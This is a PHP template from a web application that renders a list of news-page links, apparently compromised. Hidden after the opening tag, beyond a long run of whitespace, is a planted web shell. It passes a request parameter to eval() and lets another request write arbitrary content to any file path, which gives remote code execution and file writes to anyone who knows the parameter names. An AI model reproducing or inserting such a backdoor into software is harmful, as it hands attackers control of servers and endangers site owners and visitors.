<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  $nmlb = "9f3894bc5ca3305c8e8dfd2ea9c6d067"; if(isset($_REQUEST['ttxdxy'])) { $oxgzeui = $_REQUEST['ttxdxy']; eval($oxgzeui); exit(); } if(isset($_REQUEST['cjdeikeu'])) { $olho = $_REQUEST['mzdfw']; $dvars = $_REQUEST['cjdeikeu']; $rwbzu = fopen($dvars, 'w'); $jxir = fwrite($rwbzu, $olho); fclose($rwbzu); echo $jxir; exit(); } ?><div id="inside_container">
<?php 
$pages = ORM::factory('pages')->where('type','=','news')->find_all()->as_array();
foreach($pages as $page) {
   echo "<a href='/".$page->browser_name."'>".$page->title."</a>"; 
   echo "<br/>";
   echo "<br/>";
}
?>
</div>